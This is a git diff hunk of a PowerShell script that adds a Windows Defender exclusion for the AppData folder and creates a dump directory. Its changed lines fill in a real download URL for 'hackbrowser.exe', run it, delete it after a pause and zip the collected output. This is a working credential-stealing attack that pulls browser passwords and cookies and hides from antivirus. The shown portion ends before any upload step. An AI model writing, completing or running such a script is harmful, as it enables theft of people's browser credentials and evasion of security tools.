@@ -5,10 +5,10 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest -Uri "link hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
-./hb.exe
+Invoke-WebRequest -Uri "https://github.com/atividadesonline2023/atividade2023/blob/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hackbrowser.exe"
+./hackbrowser.exe
 Start-Sleep -Seconds 6
-Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
+Remove-Item -Path "$env:appdata\dump\hackbrowser.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
